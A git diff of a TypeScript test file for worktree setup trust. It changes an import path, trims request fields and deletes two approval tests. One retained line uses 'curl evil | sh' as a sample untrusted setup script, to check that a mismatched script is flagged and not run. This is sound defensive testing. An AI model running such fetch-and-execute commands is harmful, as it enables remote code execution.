@@ -3,7 +3,7 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { createHash } from 'node:crypto'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
-import type { Repo } from '../../../../shared/repo-types'
+import type { Repo } from '../../../../shared/repository/repo-types'
 import { getDefaultSettings } from '../../../../shared/constants'
 import { prepareRuntimeLocalWorktreeSetup } from './runtime-local-worktree-setup'
 
@@ -21,8 +21,6 @@ const repo: Repo = { id: 'repo', path: '/primary', displayName: 'r', badgeColor:
 function prepare(approvedSetupHash?: string, approvedSetupHashes?: string[]) {
   return prepareRuntimeLocalWorktreeSetup({
     request: {
-      repoSelector: 'id:repo',
-      name: 'w',
       setupDecision: 'run',
       ...(approvedSetupHash !== undefined ? { approvedSetupHash } : {}),
       ...(approvedSetupHashes ? { approvedSetupHashes } : {})
@@ -62,24 +60,5 @@ describe('created worktree setup trust', () => {
     expect(result.warning).toBeUndefined()
     const scriptContent = 'curl evil | sh\n\n# defaultTabs[1] dev\npnpm dev'
     expect(result.setupTrustMismatch).toEqual({ contentHash: sha256(scriptContent), scriptContent })
-  })
-
-  it("runs setup when the branch's content matches an earlier approval for the repo", async () => {
-    writeFileSync(
-      join(worktreePath, 'orca.yaml'),
-      'scripts:\n  setup: pnpm install --frozen-lockfile\n'
-    )
-    const result = await prepare(sha256(PRIMARY_TRUST_CONTENT), [
-      sha256('pnpm install --frozen-lockfile')
-    ])
-    expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
-    expect(result.setupTrustMismatch).toBeUndefined()
-  })
-
-  it('runs the created branch setup as before when an older client sends no approval', async () => {
-    writeFileSync(join(worktreePath, 'orca.yaml'), 'scripts:\n  setup: make bootstrap\n')
-    const result = await prepare()
-    expect(runner.createSetupRunnerScript).toHaveBeenCalledOnce()
-    expect(result.setupTrustMismatch).toBeUndefined()
   })
 })
